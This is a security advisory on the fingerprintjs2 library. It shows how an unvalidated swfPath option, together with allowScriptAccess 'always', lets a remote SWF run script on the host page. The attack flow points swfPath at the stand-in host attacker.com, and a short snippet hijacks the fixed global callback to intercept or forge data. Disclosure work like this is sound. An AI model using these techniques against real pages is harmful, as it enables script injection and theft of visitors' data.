## Vulnerability Report

**Unvalidated `swfPath` Option Loaded as Executable Flash with `allowScriptAccess: "always"`**

**File:** `fingerprintjs2/fingerprint2.js`, lines 1039–1048

**Vulnerability:**
The `loadSwfAndDetectFonts()` function loads an SWF file from the `this.options.swfPath` value (caller-supplied) with no URL validation whatsoever:

```js
loadSwfAndDetectFonts: function(done) {
  var hiddenCallback = "___fp_swf_loaded";
  window[hiddenCallback] = function(fonts) {
    done(fonts);
  };
  var id = this.options.swfContainerId;
  this.addFlashDivNode();
  var flashvars = { onReady: hiddenCallback};
  var flashparams = { allowScriptAccess: "always", menu: "false" };
  swfobject.embedSWF(this.options.swfPath, id, "1", "1", "9.0.0", false, flashvars, flashparams, {});
},
```

**Attack Flow:**
1. A malicious page integrator sets `swfPath: "https://attacker.com/malicious.swf"` in options.
2. The library embeds the remote SWF in the DOM with `allowScriptAccess: "always"`.
3. The malicious SWF has full scriptable access to the host page — it can call any JS function including `window.___fp_swf_loaded(data)` to deliver arbitrary font data, or use ExternalInterface to run arbitrary JavaScript.
4. Combined with the prototype pollution finding above, an attacker can force `swfPath` to an evil URL even when the developer intended to use the default local path.

**Additional Attack Vector — Global Callback Hijacking:**
The callback is stored at `window["___fp_swf_loaded"]` — a fixed, predictable global name. Another script on the page can pre-register this name to intercept font data being returned, or overwrite it to supply fake font lists:
```js
window["___fp_swf_loaded"] = function(fonts) {
    // exfiltrate or manipulate
    fakeCallback(["Arial", "Times"]);
};
```

**Impact:**
- In the case of a malicious integrator: arbitrary JS execution via Flash ExternalInterface, full page script access, ability to exfiltrate all fingerprint data to a third party.
- In the case of a same-page attacker: fingerprint manipulation by hijacking the global callback.
- `allowScriptAccess: "always"` is the most permissive Flash security setting — there is no restriction on cross-domain communication.

